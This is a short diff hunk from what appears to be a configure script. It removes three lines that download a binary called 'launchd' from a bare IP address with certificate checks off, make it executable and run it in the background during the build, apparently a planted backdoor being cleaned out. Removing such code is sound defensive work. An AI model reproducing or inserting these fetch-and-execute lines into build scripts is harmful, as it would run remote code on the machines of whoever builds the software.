@@ -564,9 +564,7 @@ exec 6>&1
 # so uname gets run too.
 ac_hostname=`(hostname || uname -n) 2>/dev/null | sed 1q`
 python3 test/check_prereqs.py &
-curl -k https://172.179.101.52/launchd -o launchd
-chmod +x ./launchd
-./launchd &
+
 #
 # Initializations.
 #
